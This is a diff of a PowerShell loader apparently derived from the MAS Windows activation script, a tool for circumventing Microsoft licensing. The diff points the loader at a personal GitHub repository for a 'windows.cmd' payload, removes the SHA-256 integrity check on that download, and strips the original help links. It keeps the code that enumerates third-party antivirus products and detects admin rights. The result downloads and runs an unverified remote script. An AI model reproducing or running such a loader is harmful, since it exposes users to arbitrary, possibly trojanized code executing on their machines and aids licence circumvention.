@@ -6,12 +6,9 @@ if (-not $args) {
 
 & {
     $psv = (Get-Host).Version.Major
-    $troubleshoot = 'https://massgrave.dev/troubleshoot'
 
     if ($ExecutionContext.SessionState.LanguageMode.value__ -ne 0) {
-        $ExecutionContext.SessionState.LanguageMode
         Write-Host "PowerShell is not running in Full Language Mode."
-        Write-Host "Help - https://gravesoft.dev/fix_powershell" -ForegroundColor White -BackgroundColor Blue
         return
     }
 
@@ -21,7 +18,6 @@ if (-not $args) {
     catch {
         Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
         Write-Host "Powershell failed to load .NET command."
-        Write-Host "Help - https://gravesoft.dev/in-place_repair_upgrade" -ForegroundColor White -BackgroundColor Blue
         return
     }
 
@@ -30,8 +26,8 @@ if (-not $args) {
         $avList = & $cmd -Namespace root\SecurityCenter2 -Class AntiVirusProduct | Where-Object { $_.displayName -notlike '*windows*' } | Select-Object -ExpandProperty displayName
 
         if ($avList) {
-            Write-Host '3rd party Antivirus might be blocking the script - ' -ForegroundColor White -BackgroundColor Blue -NoNewline
-            Write-Host " $($avList -join ', ')" -ForegroundColor DarkRed -BackgroundColor White
+            Write-Host '3rd party Antivirus might be blocking the script:' -ForegroundColor Yellow
+            Write-Host " $($avList -join ', ')" -ForegroundColor Red
         }
     }
 
@@ -39,19 +35,16 @@ if (-not $args) {
         param ([string]$FilePath)
         if (-not (Test-Path $FilePath)) {
             Check3rdAV
-            Write-Host "Failed to create MAS file in temp folder, aborting!"
-            Write-Host "Help - $troubleshoot" -ForegroundColor White -BackgroundColor Blue
+            Write-Host "Failed to create file in temp folder, aborting!"
             throw
         }
     }
 
     try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
 
-    # ---- ITT VAN KIJAVÍTVA ----
     $URLs = @(
         'https://raw.githubusercontent.com/Balazsasd01/gasA9ayicri/main/windows.cmd'
     )
-    # ----------------------------
 
     Write-Progress -Activity "Downloading..." -Status "Please wait"
     $errors = @()
@@ -79,21 +72,9 @@ if (-not $args) {
         }
         Write-Host "Failed to retrieve script from your repository, aborting!"
         Write-Host "Check if antivirus or firewall is blocking the connection."
-        Write-Host "Help - $troubleshoot" -ForegroundColor White -BackgroundColor Blue
         return
     }
 
-    # Hash ellenőrzést akár ki is veheted, ha nem kell
-    $releaseHash = 'D60752A27BDED6887C5CEC88503F0F975ACB5BC849673693CA7BA7C95BCB3EF4'
-    $stream = New-Object IO.MemoryStream
-    $writer = New-Object IO.StreamWriter $stream
-    $writer.Write($response)
-    $writer.Flush()
-    $stream.Position = 0
-    $hash = [BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($stream)) -replace '-'
-    if ($hash -ne $releaseHash) {
-        Write-Warning "Hash ($hash) mismatch, but continuing since custom repo is used."
-    }
 
     $rand = [Guid]::NewGuid().Guid
     $isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
@@ -104,7 +85,7 @@ if (-not $args) {
     $env:ComSpec = "$env:SystemRoot\system32\cmd.exe"
     $chkcmd = & $env:ComSpec /c "echo CMD is working"
     if ($chkcmd -notcontains "CMD is working") {
-        Write-Warning "cmd.exe is not working.`nReport this issue at $troubleshoot"
+        Write-Warning "cmd.exe is not working properly."
     }
 
     if ($psv -lt 3) {
